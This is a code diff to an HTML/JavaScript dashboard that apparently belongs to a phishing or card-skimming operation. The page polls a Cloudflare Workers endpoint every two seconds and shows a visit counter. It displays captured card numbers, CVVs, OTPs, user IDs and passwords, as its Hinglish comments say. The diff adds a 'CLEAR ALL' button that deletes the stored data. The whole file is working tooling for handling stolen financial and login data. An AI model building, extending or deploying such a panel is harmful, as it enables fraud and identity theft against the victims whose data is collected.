@@ -7,10 +7,9 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
         
-        /* Pure Black Background */
-        body { background-color: #000; color: #fff; padding-bottom: 50px; }
+        body { background-color: #000; color: #fff; padding-bottom: 80px; }
 
-        /* Minimal Header */
+        /* Header */
         .header {
             background: #000;
             padding: 20px;
@@ -24,7 +23,7 @@
         }
         .header h1 { font-size: 14px; letter-spacing: 3px; color: #666; text-transform: uppercase; }
         
-        /* Big White Badge */
+        /* Visit Count Badge */
         .v-badge {
             background: #fff;
             color: #000;
@@ -36,20 +35,37 @@
 
         .container { padding: 15px; display: flex; flex-direction: column; gap: 12px; }
 
-        /* Data Row with Line Break Support */
+        /* Data Row (Card, OTP, Login sab ke liye) */
         .data-row {
             background: #000;
             padding: 20px;
             border: 1px solid #333;
-            border-left: 5px solid #fff; /* White Accent */
+            border-left: 6px solid #fff; 
             font-size: 18px;
             font-weight: 800;
             color: #fff;
-            
-            /* Isse User ID aur Pass alag line mein aayenge */
-            white-space: pre-wrap; 
+            white-space: pre-wrap; /* \n ko support karta hai */
             line-height: 1.8; 
             word-break: break-all;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+
+        /* Delete Button */
+        .btn-clear {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-weight: 900;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            box-shadow: 0 0 10px rgba(255,0,0,0.4);
         }
 
         .sync { text-align: center; font-size: 9px; color: #333; margin-top: 30px; letter-spacing: 1px; }
@@ -58,14 +74,15 @@
 <body>
 
     <div class="header">
-        <h1>Activity</h1>
+        <h1>Live Activity</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
     <div class="container" id="logsDisplay">
         </div>
 
-    <div class="sync">Terminal Linked • Auto-Sync 2s</div>
+    <button class="btn-clear" onclick="clearData()">CLEAR ALL</button>
+    <div class="sync">D1 CONNECTED • AUTO-REFRESH 2S</div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
@@ -79,28 +96,37 @@
                 const display = document.getElementById('logsDisplay');
                 const badge = document.getElementById('vCount');
 
-                // Hash check to prevent blinking
                 const currentHash = JSON.stringify(data);
                 if (currentHash === lastHash) return;
                 lastHash = currentHash;
 
                 if (!data) return;
 
-                // Total count update
+                // Update Total Count
                 badge.innerText = data.length;
 
-                // Clean Render
-                display.innerHTML = data.map(log => {
-                    // Visit data ko hide kar rahe hain, sirf Login/Data dikhayenge
-                    if (log.detail === "COUNT" || log.type.includes("VISIT")) {
+                // Filter and Render
+                let htmlContent = data.map(log => {
+                    // VISIT data ko hide rakho, baki sab dikhao
+                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                         return ""; 
                     }
 
-                    // Detail mein agar \n hai toh ye alag line mein dikhega
+                    // Card, CVV, ID, Pass sab isme line-by-line dikhenge
                     return `<div class="data-row">${log.detail}</div>`;
                 }).join('');
 
-            } catch (e) { console.log("..."); }
+                display.innerHTML = htmlContent;
+
+            } catch (e) { console.log("Reconnecting..."); }
+        }
+
+        // Database saaf karne ka function
+        async function clearData() {
+            if(confirm("Bhai, saara data uda dein?")) {
+                await fetch(workerURL, { method: 'DELETE' });
+                location.reload();
+            }
         }
 
         setInterval(refresh, 2000);
